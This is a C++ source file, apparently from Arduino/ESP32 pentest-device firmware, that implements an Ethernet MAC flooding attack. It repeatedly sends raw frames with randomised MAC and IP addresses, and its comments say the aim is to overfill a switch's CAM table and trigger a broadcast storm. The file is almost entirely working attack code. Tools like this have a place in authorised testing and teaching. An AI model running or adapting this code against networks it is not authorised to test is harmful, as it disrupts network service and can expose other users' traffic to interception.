/**
 * @file MACFlooding.cpp
 * @author Andrea Canale (https://github.com/andreock)
 * @brief Implementation of an ethernet MAC Flooding attack
 * @note Sending logic backported from ARP attacks
 * @note The packet structure comes from dsniff tool(https://www.monkey.org/~dugsong/dsniff/)
 * @version 0.1
 * @date 2025-07-15
 */
#if !defined(LITE_VERSION)
#include "MACFlooding.h"
#include "Arduino.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/net_utils.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "lwip/pbuf.h"
#include "lwipopts.h"
#include <globals.h>
#include <iomanip>
#include <iostream>
#include <lwip/dns.h>
#include <lwip/err.h>
#include <lwip/etharp.h>
#include <lwip/igmp.h>
#include <lwip/inet.h>
#include <lwip/init.h>
#include <lwip/ip_addr.h>
#include <lwip/mem.h>
#include <lwip/memp.h>
#include <lwip/netif.h>
#include <lwip/sockets.h>
#include <lwip/sys.h>
#include <lwip/timeouts.h>

MACFlooding::MACFlooding() {
    setup();
    show_gui();
    loop();
}

MACFlooding::~MACFlooding() { pbuf_free(p); }

void MACFlooding::show_gui() {
    drawMainBorderWithTitle("MAC Flooding");

    displayTextLine("Press Any key to stop");
}

void MACFlooding::loop() {
    AnyKeyPress = false;
    while (true) {
        send_packet();
        if (check(AnyKeyPress)) { break; }
    }
}

uint16_t MACFlooding::calculate_ip_checksum() {
    uint16_t *buf = (uint16_t *)&ipv4_pkt;
    uint32_t sum = 0;
    size_t len = sizeof(ip_hdr);

    // Make 16 bit words out of every two adjacent 8 bit words and
    // calculate the sum of all 16 bit words
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    // Add left-over byte, if any
    if (len == 1) { sum += *((uint8_t *)buf) << 8; }

    // Fold 32-bit sum to 16 bits: add carrier to result
    while (sum >> 16) { sum = (sum & 0xFFFF) + (sum >> 16); }

    // One's complement
    sum = ~sum;

    return (uint16_t)sum;
}

void MACFlooding::prepare_packet_hdr() {
    randomize_mac(eth_header.src.addr);
    randomize_mac(eth_header.dest.addr);
    eth_header.type = htons(0x0800); // Packet type IPV4

    ipv4_pkt._v_hl = 0x45; // IPV4-Jeader len: 5 bytes
    ipv4_pkt._tos = 0x10;
    ipv4_pkt._len = htons(20);    // 20, total len
    ipv4_pkt._id = random(65535); // Avoid overflow limiting random to u16
    ipv4_pkt._offset = 0x0;
    ipv4_pkt._ttl = static_cast<u8_t>(htons(0x40)); // TTL: 64
    ipv4_pkt._proto = 0x11;                         // Protocol: 17(UDP)

    // memcpy(&ipv4_pkt.dest.addr, broadcast_mac_address, 4);

    uint8_t src_ip[4] = {
        static_cast<uint8_t>(random(255)),
        static_cast<uint8_t>(random(255)),
        static_cast<uint8_t>(random(255)),
        static_cast<uint8_t>(random(255))
    };
    memcpy(&ipv4_pkt.src.addr, src_ip, 4);

    uint8_t dst_ip[4] = {
        static_cast<uint8_t>(random(255)),
        static_cast<uint8_t>(random(255)),
        static_cast<uint8_t>(random(255)),
        static_cast<uint8_t>(random(255))
    };
    memcpy(&ipv4_pkt.dest.addr, dst_ip, 4);

    ipv4_pkt._chksum = htons(
        calculate_ip_checksum()
    ); // Since we change ip src and dst everytime, recalculate CRC of IP header
}

// Surgically change ethernet frame to include new mac address
void MACFlooding::change_mac_in_packet() {
    // Change source and destination MAC address to fill switch CAM table(src MAC addr) and generate a
    // broadcast storm(packet will be sent in broadcast)
    byte mac[6];

    randomize_mac(mac);
    memcpy(ethernet_frame, mac, MAC_ADDRESS_LENGTH * sizeof(uint8_t));

    randomize_mac(mac);
    memcpy(ethernet_frame + MAC_ADDRESS_LENGTH, mac, MAC_ADDRESS_LENGTH * sizeof(uint8_t));
}

void MACFlooding::randomize_mac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) { mac[i] = random() % 256; }
}

void MACFlooding::setup() {
    randomSeed(millis());
    netif = netif_list;
    if (netif == NULL) {
        displayError("No interface found");
        Serial.println("No interface found");
        return;
    }

    p = pbuf_alloc(PBUF_RAW, PACKET_LENGTH_MF, PBUF_RAM);
    if (p == NULL) {
        displayError("Failed to allocate pbuf");
        Serial.println("Failed to allocate pbuf");
        return;
    }

    ethernet_frame = (uint8_t *)p->payload;

    prepare_packet_hdr();

    for (size_t i = 34; i < 54; i++) { ethernet_frame[i] = random(255); }

    memcpy(ethernet_frame, &eth_header, SIZEOF_ETH_HDR);
    memcpy(ethernet_frame + SIZEOF_ETH_HDR, &ipv4_pkt, IP_HLEN);
}

void MACFlooding::send_packet() {

    uint8_t *ethernet_frame = (uint8_t *)p->payload;
    change_mac_in_packet();

    // Send packet
    netif->linkoutput(netif, p);
}
#endif
